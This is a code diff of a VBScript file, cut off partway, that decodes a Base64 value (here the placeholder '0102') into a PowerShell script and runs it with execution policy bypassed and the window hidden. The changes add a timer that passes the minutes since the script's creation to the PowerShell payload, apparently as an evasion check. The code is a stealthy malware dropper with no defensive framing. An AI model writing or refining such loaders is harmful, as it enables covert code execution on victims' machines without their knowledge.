@@ -1,16 +1,30 @@
 Dim holderX
 holderX="0102"
 
+Function GetScriptCreationTime()
+    Set fso = CreateObject("Scripting.FileSystemObject")
+    GetScriptCreationTime = fso.GetFile(WScript.ScriptFullName).DateCreated
+End Function
+
+Function GetTimeDifferenceInMinutes()
+    creationTime = GetScriptCreationTime()
+    currentTime = Now
+    GetTimeDifferenceInMinutes = DateDiff("n", creationTime, currentTime)
+End Function
+
 DecodeBase64ToFile holderX, GetPS1FilePath
 Run
 
-Sub Run
+
+Sub Run()
     Dim shell
     Set shell = CreateObject("WScript.Shell")
     Dim command
-    command = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & GetPS1FilePath & """"
+    Dim timeDif
+    timeDif= GetTimeDifferenceInMinutes()
+    command = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & GetPS1FilePath() & """ -timeDif " & timeDif
     shell.Run command, 0, True
-end sub
+End Sub
 
 Function GetPS1FilePath()
     Dim fso, shell, scriptPath, destFolder, destPath
